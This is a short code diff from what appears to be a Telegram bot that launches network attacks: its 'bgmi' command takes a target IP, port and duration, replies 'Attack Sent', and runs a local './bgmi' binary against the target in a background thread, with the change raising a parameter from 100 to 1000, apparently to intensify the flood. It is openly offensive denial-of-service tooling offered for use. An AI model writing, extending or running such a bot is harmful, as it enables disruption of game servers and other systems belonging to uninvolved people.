@@ -16,7 +16,7 @@ def bgmi(m):
         ip, port, dur = args[0], args[1], args[2]
         bot.reply_to(m, f"🚀 Attack Sent to {ip}")
         def run():
-            subprocess.run(["./bgmi", ip, port, str(dur), "100"], timeout=int(dur)+10)
+            subprocess.run(["./bgmi", ip, port, str(dur), "1000"], timeout=int(dur)+10)
             bot.send_message(m.chat.id, f"✅ Finished: {ip}")
         threading.Thread(target=run, daemon=True).start()
     except:
